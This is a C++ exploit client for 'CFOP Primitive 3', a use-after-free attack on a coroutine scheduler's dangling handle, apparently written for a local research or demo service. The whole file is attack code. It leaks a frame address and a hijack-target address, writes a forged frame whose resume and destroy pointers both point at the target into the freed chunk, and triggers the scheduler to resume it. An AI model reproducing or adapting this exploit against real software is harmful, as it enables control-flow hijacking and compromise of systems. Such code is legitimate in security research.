/*
 * sched_attacker.cpp — client for CFOP Primitive 3 (scheduler dangling handle)
 * ============================================================================
 * Leaks frame/hijack_target, stages a fake frame (frame[0]=frame[8]=
 * hijack_target) into the reclaimed chunk, then RUN makes the scheduler resume
 * the dangling queued handle -> hijack.
 */
#include <arpa/inet.h>
#include <cstdint>
#include <cstdio>
#include <cstring>
#include <netinet/in.h>
#include <string>
#include <sys/socket.h>
#include <unistd.h>

static int sfd;
static void sendline(const std::string &s) {
    std::string l = s + "\n";
    write(sfd, l.data(), l.size());
}
static std::string recvline() {
    std::string r;
    char c;
    while (read(sfd, &c, 1) == 1 && c != '\n')
        r += c;
    return r;
}
static std::string le64(uint64_t v) {
    std::string h;
    for (int i = 0; i < 8; i++) {
        char b[3];
        snprintf(b, 3, "%02x", (unsigned)((v >> (8 * i)) & 0xff));
        h += b;
    }
    return h;
}

int main(int argc, char **argv) {
    uint16_t port = (argc > 1) ? (uint16_t)atoi(argv[1]) : 4446;
    sfd = socket(AF_INET, SOCK_STREAM, 0);
    sockaddr_in sa = {};
    sa.sin_family = AF_INET;
    sa.sin_port = htons(port);
    inet_pton(AF_INET, "127.0.0.1", &sa.sin_addr);
    if (connect(sfd, (sockaddr *)&sa, sizeof sa) < 0) {
        perror("connect");
        return 1;
    }

    printf("[ATTACKER] %s\n", recvline().c_str()); // READY

    sendline("INFO");
    uintptr_t frame = 0, hj = 0;
    recvline(); // "OK"
    for (std::string l; (l = recvline()) != "END" && !l.empty();) {
        char k[64];
        unsigned long long v;
        if (sscanf(l.c_str(), "%63s %llx", k, &v) == 2) {
            if (!strcmp(k, "frame"))
                frame = (uintptr_t)v;
            else if (!strcmp(k, "hijack_target"))
                hj = (uintptr_t)v;
        }
    }
    printf("[ATTACKER] frame=%#lx hijack_target=%#lx\n", frame, hj);

    // Fake frame: resume_fn and destroy_fn both point at hijack_target.
    sendline("STAGE " + le64(hj) + le64(hj));
    printf("[ATTACKER] STAGE -> %s\n", recvline().c_str());
    sendline("RUN");
    printf("[ATTACKER] RUN -> %s\n", recvline().c_str());
    sendline("QUIT");
    return 0;
}
